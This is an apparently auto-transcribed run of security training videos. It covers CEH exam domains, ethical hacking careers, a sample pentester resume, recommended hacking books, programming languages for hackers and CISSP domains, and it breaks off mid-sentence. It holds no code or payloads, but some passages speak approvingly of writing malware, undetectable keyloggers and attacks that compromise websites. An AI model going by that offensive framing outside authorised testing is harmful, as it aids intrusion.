vulnerability assessment vulnerability
classification vulnerability assessment
solutions and tools and various
vulnerability assessment reports our
next sub-domain is about system hacking
you have concepts like gaining access
cracking passwords vulnerability
exploitation escalating privileges
maintaining access covered under this
subdomain and finally we have malware
threads under this domain malware
threads incorporate concepts like apt
concepts trojan concepts virus and worm
concepts malware analysis and so on a
total of 21 questions will be asked from
this domain
under vulnerability analysis there will
be nine questions asked system hacking
and other six questions and finally
under malware threads you will have six
other questions asked
that sums up to a total 21 with a
weightage of 17 percent for this domain
our fourth domain is about network and
perimeter hacking
here you have various sub domains and
one of it is social engineering under
social engineering you will be asked
questions based on social engineering
techniques insider threats impersonation
on social networking sites identity
theft and so on you'll also have various
question on the sniffing concepts as it
is another sub-domain
you can also expect questions from the
denial of service subdomain here
questions related to botnets and ddos
attacks will be asked
various session hijacking concepts are
another crucial part of this domain
the final subdomain is about evading ids
firewalls and honeypots
here various concepts on ids ips
firewall and honeypots are covered you
will need to understand how to evade ids
and firewalls and how to detect
honeypots
a total number of 18 questions will be
asked from the fourth domain that was
network and perimeter hacking and the
weightage for this domain is 14
our fifth domain is about web
application hacking and our first sub
domain in it is hacking web servers
this incorporates concepts related to
web server attacks web server attack
tools patch management and so on
the next subdomain is about hacking web
applications here you have various
concepts related to bypass client side
controls analyze web applications
footprint web infrastructure attack
access controls and how to perform
injection attacks and so on
finally under the sequel injection
subdomain you will have questions based
on sql injection the types of sql
injection the sql injection methodology
sql injection tools aviation techniques
and sql injection countermeasures
here a total of 20 questions will be
asked from this domain
and that is a weightage of 16 will be
given to the web application hacking
domain
our sixth domain is solely devoted to
wireless network hacking
this domain focuses on hacking wireless
networks various wireless concepts
wireless encryption wireless threats
wireless hacking tools various hacking
methodologies bluetooth hacking and
wireless counter measures are covered a
total of eight questions will be asked
from this domain with a weightage of six
percent
our seventh domain is all about mobile
platform iot and ot hacking our first
sub domain here is hacking mobile
platforms
here the concepts that are touched upon
are mobile platform attack vectors
hacking android os hacking ios mobile
device management and mobile security
guidelines and tools
our next subdomain here is about iot and
ot hacking which covers concepts on iot
hacking tools its methodologies counter
measures and it also speaks about ot
concepts ot attacks ot hacking tools and
ot counter measures
you have a total of 10 questions asked
from this domain with a weightage of 8
the next domain is very interesting and
it is all related to cloud the cloud
computing domain covers concepts based
on cloud computing serverless computing
cloud computing threats cloud hacking
and cloud security the weightage given
to this domain is six percent with the
total number of questions of seven and
finally we have cryptography as our
ninth domain
as the name suggests this domain covers
topics based on cryptography concepts
encryption algorithms cryptography tools
public key infrastructure email
encryption disk encryption cryptanalysis
and counter measures
and seven questions will be asked from
this domain with a weightage of six
percent
now that you saw the ch exam topic's
weightage let us have a closer look at
the ch exam details let us first have a
look at the ch exam based on mcqs
the exam title is certified ethical
hacker with the exam code of 312-50
this exam will have 125 questions with a
time limit of 4 hours the test format is
multiple choice questions
the pass percentage varies ideally
between 60 to 85 percent now let's have
a look at the ch practical exam details
in order to gain the ch master
recognition it is mandatory that you
take up the ch practical exam as well
the exam title is certified ethical
hacker practical and this practical exam
will have 20 questions with a duration
of six hours
the exam format will be ilab cyber range
and finally the passing score for the ch
practical exam is at 70 percent after
clearing both the mcq based exam and the
practical exam you can get the ch master
recognition now that we had a look at
the ch exam details let us have a look
at the career prospects for a
professional with this certification
having the ch certification guarantees
that you have an insight into the
hacking world hence companies want to
hire professionals who can think like a
hacker and safeguard their networks and
systems
a candidate with the ca certification
can apply for various cyber security job
roles such as penetration tester
security engineer and information
security analyst from the long list
according to pay scale the annual
average salary of a ch professional in
india is rupees 5 lakhs per annum
meanwhile in the united states a
professional holding the ca
certification earns nearly 93 000 on an
average basis annually now that you have
a look at the ch version 11
certification and its career prospects
what are you waiting for get certified
with simply learn and back that ca
certification with the increase in the
number of cyber crimes across the globe
there is also an increase in the number
of cyber security jobs and the role of
an ethical hacker tops the list hi guys
this is shruti from simply learn and
today i will run you through this video
on ethical hacking career so let's get
started and explore the world of ethical
hacking let's begin with a few facts did
you know that by the year 2021 there
will be 3.5 million security job
openings that is a huge number isn't it
and also according to the u.s bureau of
labor statistics there will be 28
increase in the number of jobs from 2016
to 2026 for information security
analysts which includes ethical hackers
this proves that there is a great demand
for ethical hackers at the moment as i
mentioned earlier the number of cyber
crimes across the world will increase as
the digital era will only continue to
grow organizations will be on the
lookout to hire professionals who can
fight these cyber crimes and protect the
company's data and to fight these cyber
crimes we will require individuals who
can think like a hacker and who is that
well to do this job we have ethical
hackers as you might be knowing an
ethical hacker is trained to discover
system vulnerabilities an ethical hacker
is also known as a white hat hacker he
or she is given authorization from the
company to perform security assessments
and at the end an ethical hacker would
have to report the findings back to the
company so that the vulnerabilities can
be fixed an ethical hacker performs
these security assessments with the help
of various hacking techniques and tools
let's now move on to our next topic that
is the steps to become an ethical hacker
you might wonder how to start your
ethical hacking career right well i will
take you through that step by step
firstly the candidate must have a
computer science or an information
technology bachelor's degree it is also
possible to become an ethical hacker
without these degrees but provided you
have the required skill sets and
experience the next requirement to be an
ethical hacker is that the candidate
must have a minimum of two years of
experience in the information security
field you have to start your career with
a software or a networking job and only
then can you move on to the ethical
hacking field you have to start your
career with a software or a networking
job and only then can you move into the
ethical hacking field coming to the
certifications it is necessary for the
candidate to hold various cyber security
certifications certifications play a
vital role in the field of cyber
security your job opportunities can
solely depend on these certifications to
become an ethical hacker you can start
off with the foundational level
certifications such as the ccna and
comptria security plus certifications
finally the last step to become an
ethical hacker is to clear the certified
ethical hacker examination ch
certification is provided by the ec
council it trains the candidate to
protect a company's network by using the
same tools and methods that a hacker
would use the ch exam will have a
duration of 4 hours with 125 number of
questions if the candidate clears this
exam then he or she will become a
certified ethical hacker now that you
know the steps to become an ethical
hacker let's look into the skill sets
which are required to help you achieve
these steps first and foremost an
ethical hacker needs to have an in-depth
knowledge of the working of the
operating systems knowledge of windows
linux and macintosh operating systems is
required for penetration testing
creating exploits and bug hunting
programming will be important so
knowledge of programming languages such
as cec plus plus html python and php
will be very helpful basic knowledge of
networking tcp protocols and osi model
is necessary as networking is the
foundation of cyber security for
securing databases knowledge of sql
nosql postgresql is necessary
cryptography is used to secure
information it is the process of
converting data from a readable format
to a non-readable format and vice versa
cryptanalysis is decryption without a
secret key in most cases certified
ethical hacker would need to perform
cryptanalysis hence ethical hacker has
to be comfortable with cryptography and
cryptanalysis ethical hackers should be
proficient in network security control
measures such as intrusion detection and
intrusion prevention techniques now
let's move on to the responsibilities
which are taken care of by an ethical
hacker let's have a look at these
responsibilities an ethical hacker is
responsible for scanning systems open
and closed ports using tools like nessus
and nmap vulnerabilities and threats are
identified by doing this in addition to
scanning for vulnerabilities they also
search the deep corners of the network
to spot critical information such as
passwords which can make the
organization vulnerable to an attack in
addition to building and maintaining ids
ips and firewalls they also try to evade
these security measures to gauge the
performance of the systems a lot of
times a company's online fraud or online
theft incidents are looked into by an
ethical hacker an ethical hacker also
checks for sniffing networks and
hijacked web servers and applications
those were the responsibilities of an
ethical hacker now let's look into the
various job roles an ethical hacker can
apply for it is a misconception that an
ethical hacker will perform only
penetration testing well there are a
number of other jobs an ethical hacker
can apply for the different job roles
such as that of a penetration tester
information security analyst security
consultant and an information security
manager let's have a look at each of
these job roles one by one a penetration
tester performs the typical
responsibility of an ethical hacker that
is he or she tries to exploit a security
system's vulnerabilities this is carried
out using different hacking tools and
techniques an ethical hacker can also
apply for the role of an information
security analyst there is a difference
between the job rules of a penetration
tester and that of an information
security analyst here the candidate will
be required to primarily design and
protect the organization's network from
various cyber attacks finally the
candidate is also required to document
the identified security breaches so that
it can be omitted the next time the
responsibilities of a security
consultant is more or less similar to
that of an information security analyst
that we saw previously as a security
consultant you will be responsible to
design implement and maintain barrier
security architectures in addition to
this you're also required to upgrade the
security systems as and when required
finally an ethical hacker can also apply
to the role of an information security
manager as the name suggests this role
will require the candidate to possess
managerial skills as an information
security manager is responsible to head
the i.t and the information security
team now that we have seen the
responsibilities the skills and the
steps to become an ethical hacker let's
have a look at the different companies
hiring ethical hackers to name a few we
have bank of america ernest and young
kpmg urban pro and ibm let's now look
into the salary structure of an ethical
hacker well in india the average annual
salary of a certified ethical hacker is
nearly 4 lakhs 76 000 rupees and in the
us the average annual salary of a
certified ethical hacker is 91 000
now i will guide you through a sample
resume of a penetration tester as you
can see on your screens this is a sample
resume of a penetration tester we will
look into this resume closely and
understand how your resume should look
like if you are applying for the role of
a penetration tester as always you can
start off with your name and your email
id and your phone number followed by a
brief summary of your current job
profile it is preferred to add your
linkedin profile link here and also your
github profile link if you have one as i
mentioned earlier this is a sample
resume for a penetration tester and
hence we have to have more than two
years of experience in the information
security field as you can see under the
experience section the candidate has two
prior experiences out of which the first
experience is that of a software tester
and second is that of a penetration
tester you would have to mention your
latest or current experience at the
beginning you can mention your job role
and the company and the duration under
which you can list out the various
responsibilities that you are looking
into currently if you are a penetration
tester you can mention responsibilities
such as security monitoring black box
testing
documentation of the results
vulnerability scanning and so on below
this you can mention your first
company's experience with the roles and
responsibilities that you have performed
earlier here the candidate was a
software tester before becoming a
penetration tester let's move on to the
education section here the candidate
holds a bachelor's degree in computer
science you can mention your degree
followed by the university name or if
you're applying for any other role in
the cyber security domain it is
recommended that you list out the
certifications as well to start off with
a ccna certification will be preferred
followed by a certified ethical hacker
certification which is a must if you are
applying for the role of a penetration
tester in addition to it the certified
expert penetration tester certification
will also hold a great advantage after
mentioning the certifications you can go
ahead and mention your skill sets here
we have the technical skills and
non-technical skills under technical
skills you can mention the programming
languages that you know here we have c c
plus plus java perl you can also mention
the operating systems that you have
worked on for example windows linux unix
and in addition to the programming
languages and the os you can also
mention the tools that you know such as
nmap metasploit tools which will be
helpful if you are applying for the role
of a penetration tester then you can
also mention encryption technologies
knowledge of sql and bug tracking
systems if you have worked on them
before if you have participated in a
code authored you can mention that here
as well under the non-technical skills
you can mention various competitions
that you have taken part in and the
games that you like and other
extracurricular activities finally you
can also mention the projects undertaken
under the projects undertaken you can
talk about the various projects that you
have performed in your company or
outside the company here we have two
projects one as a software test engineer
and second one as a penetration tester
so this is how a resume of a penetration
tester will look like before jumping
into the best books for ethical hacking
let's speak a bit about cyber security
i'm sure you all already know what cyber
security is but here's a refresher
cyber security refers to the practice of
protecting networks programs computer
systems and their components from
unauthorized digital access and attacks
did you know that according to the
university of maryland hackers attack
every 39 seconds that is on an average
2244 times a day
now that's a huge number
speaking of hacking let's define the
term ethical hacking before diving into
the books for it
so when a system's vulnerabilities are
discovered and exploited with the motive
of ensuring system security it is known
as ethical hacking people who carry this
out are termed as ethical hackers
ethical hackers perform hacking with
prior permission from the concerned
authorities in order to perform this and
carry out penetration testing various
hacking techniques and tools are used
now let's go ahead and have a look at
how books can help you learn to hack
the books we are going to talk about in
this live session will familiarize you
with hacking on the whole these books
will introduce you to new ideas and help
you solve problems reading in general is
great as it helps with your thought
process and keeps you mentally alert it
is important that you use the
information in the upcoming books only
for lawful purposes
so let's get started and see the best
books which can help you with hacking
the first book we have is the basics of
hacking and penetration testing
this book is written by patrick
ingretzen for all your beginners out
there if you're clueless about how to go
about hacking then this is a good read
for you all having said that this book
is not just for beginners but even for
those individuals who are only exposed
to superficial penetration testing logic
this book dives deep into the tools and
processes that are used by penetration
testers to gain access to the systems
the basics of hacking and penetration
testing book will help you achieve a
better understanding of offensive
security as well you'll be acquainted
with various phases of ethical hacking
here
the book contains seven chapters and it
focuses on hacking tools such as
backtrack linux google reconnaissance
nmap nessus metasploit and hacker
defender rootkit to name a few the fun
part is that each chapter consists of
hands-on exercises that help you
interpret and implement results in each
phase this book is apt for students
beginning infosec professionals and
security consultants
the second book we have is hacking a
beginner's guide to computer hacking
basic security and penetration testing
it is written by john slavio
this is yet another go-to book for
beginners this book can be your first
step to a career in ethical hacking it
will cover all the basics with respect
to hacking security and pen testing
the tools covered in this book are
history of hacking types of hackers
various types of hacking attacks basic
hacking tools and software and hiding ip
address it also speaks about mobile
hacking hacking an email address
penetration testing and spoofing attacks
up next we have hacking the art of
exploitation
it is written by john erickson this book
has two editions one which was published
in 2003 and the other in 2008.
this book is famous for the hacking
approach it teaches it focuses on
network security and computer security
it helps you understand how to develop
exploits rather than just using them if
you want to up your ethical hacking game
then this book definitely requires a
read
hacking the art of exploitation in its
second edition introduces you to c
programming from a hacker's perspective
out of the plethora of concepts that you
will learn in this book few crucial ones
are that you will learn to program
computers using c and shell scripts you
will also be able to outplay security
measures like intrusion detection
systems having said that you will also
learn to hijack tcp connections crack
encrypted wireless traffic and speed up
brute force attacks
let's now have a look at the next
ethical hacking book on our list and
that is kali linux ethical hackers
cookbook
this book revolving iran kali linux is
written by himanshu sharma
kali linux is primarily used for
advanced penetration testing and also
for security auditing it contains
numerous tools that are geared towards
various security tasks such as security
research penetration testing and so on
this book will help you get started with
installation and configuration of kali
linux which will enable you to perform
your tests in addition to that you will
learn to perform web application
exploitation using tools such as burp
you will also be acquainted with
performing network exploitation using
metasploit and by a shark lastly you
will know how to conduct advanced
penetration testing these were few of
the concepts you will be learning
besides a lot more others in the book
at number 5 we have metasploit the
penetration testers guide
this book is written by four authors
david kennedy jimmy gorman
devon kearns and martija haroni
the metasploit framework is a powerful
tool for hackers to exploit ip addresses
and ports in it
this framework makes discovering and
exploiting vulnerabilities easy
but for first time users it can be a
little tricky hence this book will teach
you all about metasploit
you will learn the frameworks interfaces
module system and more as you launch
simulated attacks after which you will
move on to advanced penetration testing
techniques which include network
reconnaissance client-side attacks
wireless attacks and targeted social
engineering attacks you will also learn
to integrate nexpose nmap and message
with metasploit to automate discovery
up next we have penetration testing a
hands-on introduction to hacking
this book is written by georgia wiedman
as the name suggests this book shows an
insight into penetration testing a
penetration tester discovers security
weaknesses in operating systems networks
and applications penetration techniques
are used to gauge enterprise defenses
this book focuses on the core skills and
techniques a penetration tester requires
here you will go through the prime
stages of an actual assessment which
includes gathering information under
vulnerabilities gaining access to
networks and so on
in addition to the above you will learn
to crack passwords with the techniques
of brute forcing and word lists bypass
antivirus software automate attacks and
you will also learn to use metasploit
framework for launching exploits and for
writing your own metasploit modules out
of the many other learnings
moving on to our next book we have the
hacker playbook 3.
the hacker playbook 3 practical guide to
penetration testing is written by peter
kim
this is the third iteration of the
hacker playbook series it brings with
itself new strategies attacks exploits
tips and tricks
besides all the new concepts it also
highlights a few techniques from the
previous versions many schools have this
book incorporated in their teaching
the hacker playbook 3 red team edition
acquaints you with the red team
red teams simulate real-world advanced
attacks to test your organization's
defensive teams a red teamer will
accurately test and validate the overall
security program reading the hacker
playbook 3 will help you advance your
offensive hacking skills and attack
parts in addition to that it also
focuses on real world attacks
exploitation custom malware persistence
and more
this heavily lab-based book will
incorporate several virtual machines and
custom the hacker playbook tools
at number eight we have black hat python
python programming for hackers and pen
testers
justin seeds is the author of this book
as you know python is a very strong
programming language and it comes to
great use when creating powerful and
effective hacking tools python is the
chosen language by many security
professionals across the world and many
exploit frameworks are written in python
in this book you will go through the
darker side of python's capabilities
like infecting virtual machines writing
network sniffers creating trojans etc
this book covers some networking
fundamentals interesting network tooling
web applications windows privilege
escalation tricks and more this book as
the author says is a fun read
moving on at number 9 we have the web
application hackers handbook finding and
exploiting security flaw
it is written by david started and
marcus pinto
this new edition focuses on updated web
applications exposing them to attacks
and executing fraudulent transactions
this web application hackers handbook is
updated to speak about the latest
step-by-step methods for attacking and
defending the large range of
ever-evolving web applications
it also discusses new remoting
frameworks html5 ui redress and hybrid
file attacks to name a few it looks into
attacking authentication attacking the
application server finding
vulnerabilities in source code etc if
you have already mastered the first
edition you can focus on new concepts in
this one
now let's head to our last book on our
list
at 10 we have web security testing
cookbook systematic techniques to find
problems first
the author of this book is parkour hope
and ben walther
security testing is quite often a
neglected one when it comes to the tests
performed on web applications but it is
a very crucial one this book teaches you
how to check for the most common web
security issues it also acquaints you
with installing and configuring free and
good security testing tools
you will also understand how your
application communicates with users and
this book will help you build tests
pinpointed at ajax functions and help
you automate the tests with the
knowledge of this book and the free
tools used here you can defend your site
so those were the top 10 books for
ethical hacking
now that you had a look at the books
let's move on and see how simply learn
can help you become an ethical hacker
simply learn provides a certified
ethical hacker ch version 10 course this
ca certification training course
provides you hands-on training that will
help you master the techniques used to
penetrate network systems and defend
your system against it
simply learns ethical hacking courses
aligned with the latest ch version 10 by
ec council here you will learn about
trojans back doors and counter measures
ids firewalls and honeypots advanced
hacking concepts network packet analysis
mobile and web technologies and advanced
log management this course content
includes an introduction to ethical
hacking penetration testing and ethical
hacking concepts
it also speaks about sql injection iot
hacking and cryptography to name a few
there are no prerequisites to take up
this certification training course first
let's understand the importance of
knowing programming for hacking
you might wonder if programming is a
necessity to become a hacker
as you might be aware hacking involves
breaking the protocols and exploiting a
network thus being a hacker requires you
to understand the languages of the
software that you are focusing on
hence it is required that a hacker knows
coding having zero coding knowledge will
definitely limit your opportunities in
the future
knowing different programming languages
is undoubtedly an asset for hackers
everyone wants to become a hacker today
however it is not as easy as it is shown
in numerous movies it takes plenty of
practice and programming knowledge to
become an ethical hacking expert
if you want to become a hacker it is
imperative that you have a knack for
programming languages it is a known fact
that some of the world's best hackers
started off as programmers
if you know how to program you will be
able to dissect a code and analyze it
you can write your scripts or malware
that can be used on the victim yes there
are several ready-made scripts available
today however you might need to apply
your skills in case the available
scripts don't work well for you
sometimes when script modification is
required you should be in a position to
do that in such a scenario zero
knowledge of the respective programming
language will definitely be a hindrance
programs can also help you automate
multiple tasks which would normally take
a lot of time
codes allow you to penetrate different
fields you want to hack it will help you
identify the plan behind an attack and
defend against deadly hacking techniques
and make your cybersecurity career
worthwhile
it will help you understand the working
of the target system or application
before carrying out an exploit now that
we have an idea as to why programming is
important for hackers let us understand
which programming languages should a
hacker learn
there are several programming languages
for hacking and it might be overwhelming
to choose from the endless list here we
are to help you with that
do keep in mind that your choice of
programming language will also depend on
the type of system you are targeting and
your strategy
let us now move on to the list of the
top programming languages that are
extensively used by hackers around the
world
as you see on your screens here we have
the top five programming languages for
hackers let us go through them one by
one
number one on our list is one of the
most popular programming languages today
that is python
python is a general purpose programming
language and in the field of hacking it
is mainly used for exploit writing
it is referred to as the de facto
hacking programming language it plays a
crucial role in writing hacking scripts
exploits and malicious programs
one great feature that makes hacking
easy with python is the availability of
ready-made modules
for example os modules are available if
the target is a native operating system
for networking there is a socket module
and a lot more
python socket programming can be used
for discovering vulnerabilities in a
system since python code helps in
checking the security integrity of
systems and it can also be used to
exploit them
python has a massive community that
helps with third-party plugins every day
it is also an easy to read language with
a simple syntax this will be helpful for
beginners
you can easily write automation scripts
using python and it also makes
prototyping much faster
moving on to our second programming
language we have javascript
currently javascript is one of the best
programming languages for hacking web
applications
a good understanding of javascript
allows a hacker to discover
vulnerabilities and carry web
exploitation since most of their web
apps use javascript or one of its
libraries
knowing javascript will help you
discover flaws in web applications
javascript can be used to read saved
cookies and security experts also use
javascript to develop cross-site
scripting programs for hacking
javascript is known for carrying out
attacks like cross-site scripting
javascript can also be used to spread
and reproduce malware and viruses easily
initially javascript was a client-side
scripting language however with the
release of node.js it now supports
back-end development
this implies a larger field for
exploitation
a hacker can now use javascript to snoop
the type towards inject malicious code
and track browsing history to name a few
number three on our list is php
hypertext preprocessor or php is a
dynamic server-side programming language
that is used to build websites
hackers should understand php as it will
help them understand web hacking
techniques better
especially if you are into web hacking
then getting your hands on php would be
an asset
php is used in server side scripting
using php you could write a custom
application that modifies settings on a
web server and makes a target server
susceptible to attacks
with the help of php you can also
eliminate any vulnerabilities in your
code
php is one of the most powerful server
side languages used in most of the web
domains
this shows how learning php can help you
with web hacking and also help you fight
against malicious attackers
popular content management systems run
on a foundation of php hence having a
strong knowledge of php can help you
protect or compromise such websites
next on a list of the best programming
languages for hackers is sql
sql is the acronym for structured query
language
although sql is not a traditional
programming language it is a language
used for only communicating with
databases
several systems like mysql postgresql
store their data in databases
sql is used to interact with such
databases in order to organize add
retrieve delete or edit data from a
database
having an in-depth knowledge of sql lets
you comprehend the structure of a
database thereby helping you decide
which scripts or tools to deploy
sql is used for the purpose of web
hacking sql is undoubtedly the best
programming language when it comes to
hacking into large databases
it will be impossible to contract
database attacks without a good
understanding of sql
using sql hackers can perform an attack
known as sql injection attack such an
attack enables hackers to access
confidential information from databases
sql is used by hackers to develop
various hacking programs based on sql
injection
sql injection is used to bypass web
application login algorithms that are
weak
such an attack can also help a hacker
view and modify confidential information
from databases
finally at number 5 we have the c
programming language
it is no surprise that we have c the
mother of all programming languages on
our list
it is used massively in the security
field it helps with exploit writing and
development
the low level nature of c provides an
edge over other programming languages
used for hacking
a hacker can use the c programming
language to his or her advantage when it
comes to accessing low-level hardware
components such as the ram
security professionals mostly uc when
they are required to manipulate system
resources and hardware
c also helps penetration testers write
programming scripts
most operating systems and computer
programs are coded in c language hence
learning c u will help hackers get an
overview of the structure of operating
systems
c is also used to create shell codes
root kits exploits build undetectable
malware keyloggers and much more
sometimes it is also advisable to learn
both c and c plus plus as they both come
in handy for hackers
so those were our top five programming
languages for hackers do keep in mind
that the most important step of becoming
a hacker is to learn various programming
languages it will be great if you can
master a variety of programming
languages as your target will not be the
same always on that note in addition to
previously mentioned programming
languages we have an additional list of
languages that are also well recognized
for hacking let's have a look at our
honorary mention
first we have ruby the ruby programming
language has been used for exploitation
for quite some time now
there can be a close comparison drawn
between ruby and python based on its
syntax
however ruby is more web focused
ruby can be used to write either small
or large scripts and can be used
interchangeably with bash scripting
it offers good flexibility while writing
exploits ruby has been used by several
hackers to exploit corporate systems it
is not that easy to master ruby and that
is one reason why mncs look for
professionals who know ruby
second we have pearl
although pearl has lost its old fame it
still holds value in the hacker
community for exploit writing
there are systems that still run on perl
as it was the go to solution once
it is a great language that can help you
manipulate linex text files and help you
create tools and exploits
perl code bases still do occupy a
considerable portion of corporate tools
third on our list is html
many of you might have wondered why we
didn't mention html yet
yes no programming list is complete
without mentioning html
the hyper text markup language html is a
standard markup language used for
creating web pages
it glows the whole internet together and
it is the language of the web
this shows the importance html has
an understanding of html is vital to
play with web applications
html also finds its use in developing
hybrid mobile and desktop apps
html is a must if you want to master
this field having said that html is not
that tough for language to learn hence
it is advised to master html if you want
to compromise web applications
and finally at 4 we have assembly level
language
it is undoubtedly one of the most
powerful yet hardest programming
languages to learn
it is a complicated low-level
programming language
for hacking primitive systems assembly
is one of the best programming languages
the best part of assembly is that you
can instruct machine hardware or
software using it
assembly language helps a hacker
manipulate systems straight up at the
architecture level
it is also the most suited coding
language to build malware like viruses
and trojans
it is considered to be the best language
for jobs that are time critical
reverse engineers use assembly language
for example if you're interested in
software cracking and if you want to
reverse engineer a piece of software
that has already been compiled assembly
is the go-to choice as complicated as a
language sounds the results it produces
are highly fruitful
so those were the additional programming
languages that can help you become a
skilled and successful hacker we should
keep in mind that a strong understanding
of programming languages help cyber
security professionals stay on top of
cyber criminals so let's start off this
tutorial by understanding the need for
the cisp certification if you have seen
our previous videos you would be aware
of the various cyber security
certifications like ccna comtia security
plus cism cisa and ch to name a few you
might have also come across the cssp
certification let me tell you this is
one of the toughest and most in demand
certification in the cyber security
field in the current times managing
information security in a company can be
extremely challenging with the advent of
the internet and various other
technologies there is a large exposure
to various security breaches the
presence of information security experts
in-house helps organizations manage
their i.t processes in a better way this
is where a ci sp professional is in
demand by employers compared to the
other cyber security professionals the
demand for cssb certified professionals
has grown rapidly there are nearly 50
000 job postings for the same now that
you have an idea of the demand of cssp
certified professionals let's move on to
understanding what exactly is cisp cssp
stands for certified information system
security professional it is considered
the gold standard in the field of
information security this certification
is taken up by id professionals it
trains a candidate to become an
information assurance professional
taking up the cssp certification will
help you define the design architecture
controls and management of highly secure
business environments you will also be
called a cssb professional only after
you successfully pass the cssp exam so
now let's have a look into the cssp exam
requirements the primary requirement for
any candidate is that they should have
at least five years of work experience
in the field of information security in
addition to this it is also suggested
that the candidate clears other
certifications like ccna comchair
security plus ceh casm and cisa to name
a few cssp is considered as an advanced
level cybersecurity certification hence
it is better if the candidate clears the
basic level and the managerial level
certifications before moving to the cssp
certification as i mentioned earlier
this certification is suitable for
professionals who have a minimum of five
years of work experience professionals
working as security consultants and
managers network and security architects
i.t directors security auditors and
chief information security officers can
take up the cssp certification let's now
move on to our next topic that is cisp
domains this entire certification is
grouped into a total of eight domains
the broad spectrum of topics included in
cssp ensure its relevance across all
disciplines in the field of information
security successful candidates are
competent in the following eight domains
they are security and risk management
then we have asset security security
engineering communications and network
security followed by identity and access
management then security assessment and
testing security operations and finally
we have software development security
these eight domains deal with different
aspects of information security we will
have a look into each of these
individually and understand what each of
these domains symbolize first up we have
the security and risk management domain
as the name suggests this domain mainly
consists of the fundamentals of security
policies compliance law and regulations
professional ethics risk management and
threat modeling cyber security and
information security plays a major role
in this domain there is a difference
between cyber security and information
security which is more often missed out
on by people cyber security refers to
several techniques used to protect the
integrity of networks whereas
information security refers to processes
and tools deployed to protect sensitive
information to implement cyber security
we have a list of approaches like
compliance based ad hoc and risk based
in compliance based security measures
are decided based on regulations while
in ad hoc security measures are based on
no specific criteria in risk-based
security measures are based on unique
risks depending on the organization
let's now have a look at the cia triad
here c stands for confidentiality i for
integrity and a for availability
confidentiality integrity and
availability have served as the industry
standard for computer security since the
time of the first mainframes
confidentiality means that information
and functions can be accessed only by
authorized parties for example military
secrets integrity means that information
and functions can be added altered or
removed only by authorized people and
availability means that systems
functions and data must be available on
demand
now that we have understood the cia
triad let's have a look at the grc
trilogy this trilogy is a structured
approach adopted by organizations to
align it objectives with business
objectives first up we have governance
such a program has motives like ensuring
goals are achieved providing strategic
plans and so on governance is taken care
of by the senior professionals of an
organization next up we have risk
management here the organization looks
into mitigating all types of risks such
as investment physical and cyber risks
finally we have compliance as discussed
previously compliance refers to abiding
by the defined laws and regulations so
who do you all think develops a security
policy which is used to achieve the
organization's goals well it is done by
the senior management of an organization
let's have a look at the characteristics
of these security policies first and
foremost these policies should support
the vision and mission of the company
all the business units should be
integrated in these security policies
they should also be regularly updated
and finally it is important that these
security policies should be easy to
understand so that everyone can abide by
them without any problem in addition to
security policies a risk analysis team
is also formed in organization to
perform the analysis of each known risk
there are various steps to perform risk
analysis let's have a look at each of
these first the team makes an assessment
of the value of the company's assets
then there is an analysis made based on
the risks to assets and finally the team
discovers solutions to mitigate these
risks now that was all about the first
domain of cisp security and risk
management let's have a look at the
second domain asset security asset
security deals with the collection and
protection of assets such as data and
devices here we will be looking into
data classification data management data
remnants and data loss prevention so in
data classification the data owner
classifies data a data owner can be an
individual or a group of people who
created the information and are directly
responsible for it this classification
is done based on a set of predefined
criterias at the end the classification
is annually reviewed to see if there has
to be some change incorporated data
management involves managing the
information lifecycle needs of an
enterprise in an effective manner it
also ensures that the data complies to
the set standards and finally data
management also ensures data validity
and integrity moving on to data remnants
it is a term used for the residual of
digital data that is present even after
trying to erase the data data remnants
should be avoided as data should be
completely destroyed to tackle data
remnants we have methods like
overwriting and destruction to name a
few in overwriting other information is
written over the data several times so
that the original data cannot be
recovered in destruction data in the
storage device is physically damaged to
make recovery difficult asset security
also looks into data loss prevention
here several measures and risk
assessments are performed to ensure that
information is only available to
authorized users let's now move on to
our third domain security engineering as
the name suggests this domain talks
about security architecture security
models cryptography and physical
security security architecture
establishes a common practice for
creating analyzing and using
architecture description within a
particular domain security architecture
takes the help of tcb that is trusted
computing base security perimeter and
reference models to implement security
cryptography is also a part of security
engineering in cryptography information
is secured by converting data from a
readable format to a non-readable format
and vice versa moving to our fourth
domain we have communications and
network security this domain is all
about network structures transmission
methods and security measures used to
achieve cia in an organization osi model
is the foundation of networking this
model that is the open systems
interconnection model osi model
describes how data is transferred from
one computer to another the osi model
consists of seven layers starting from
physical layer then data link layer
network layer transport layer session
layer presentation layer and finally
application layer in the first layer
that is physical layer transmits raw bit
stream over the physical medium then
data link layer defines the format of
data on the network network layer
provides logical addressing and it also
provides path determination using local
addressing the fourth layer that is
transport layer provides end-to-end
connections in this layer data is
transmitted using transmission protocols
including tcp and udp the session layer
maintains connections and it is also
responsible for controlling ports and
sessions the sixth layer that is the
presentation layer ensures that data is
in a usable format and finally in the
seventh layer that is the in the
application layer human computer
interaction happens here applications
can access the network services the
communications and network security
domain also talks about firewalls we can
define a firewall as a hardware or
software which is used to block the
incoming or outgoing traffic from the
internet to your computer then we also
have the ids ids is known as the
intrusion detection system this is
designed to detect unauthorized access
to a system ids is used together with a
firewall and a router moving to identity
and access management a fifth domain
let's have a look at what this domain is
all about this domain of cisp is all
about the access control identification
authorization and attacks on access
control and its countermeasures to be
able to access a data set or a resource
a subject has to be identified
authenticated and authorized identity
management kerberos and access criteria
are few of the crucial fields here in
identity management through automated
means users are identified and
authenticated this domain also speaks of
kerberos an authentication protocol that
is based on symmetric key cryptography
and provides end-to-end security access
to data shouldn't be granted to anyone
and everyone in fact it should be
granted based on the level of trust and
the job role in the organization it is
also better if it is provided based on
the location and the time let's now have
a look at our sixth domain security
assessment and testing so in this domain
we will look into audit security control
assessment and testing reports as you
might have heard of the term audit it is
nothing but a repeated process where in
an independent professional evaluates
and analyzes evidence then we have
vulnerability assessment wherein i.t
risks are identified and evaluated it
helps in identifying quantifying and
prioritizing vulnerabilities a
well-planned and executed assessment and
test strategy can provide valuable
information about risk and risk
mitigation the assessment and test is
executed by a working group called the
integrated product team testing is
performed to check the data flow between
the application and the system up next
we have the security operations domain
the seventh domain of csp is all about
investigations monitoring and logging
disaster recovery and change management
here we will look into the fields of
digital forensics incident management
and perimeter security investigation of
a computer crime is also known as
computer foreign six in digital foreign
six data is examined to identify recover
and analyze opinions about digital
information incident management works to
restore the services to normal as soon
as possible a team called the incident
response team is deployed to handle such
emergencies incidence response is
defined as a practice of detecting a
problem determining its costs minimizing
the damage resolving the problem and
documenting each step this team provides
management with sufficient information
and defends the company against future
attacks in perimeter security there is
perimeter defense which allows us to
detect and keep a check on unauthorized
physical access this field also controls
